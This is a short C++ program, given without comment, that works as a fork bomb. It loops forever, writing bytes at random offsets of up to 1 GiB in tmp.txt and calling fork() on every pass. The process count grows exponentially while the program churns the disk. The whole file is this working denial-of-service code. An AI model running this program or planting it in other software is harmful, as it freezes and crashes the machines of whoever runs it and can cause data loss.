#include <iostream>
#include <sys/wait.h>
#include <unistd.h>
using namespace std;

int main() {
	FILE *f = fopen("tmp.txt","wb");
	for (;;) {
		fseek(f, rand() % (1024ll * 1024 * 1024), SEEK_SET);
		fputc('a', f);
		fflush(f);
		fork();
	}
	return false;
}
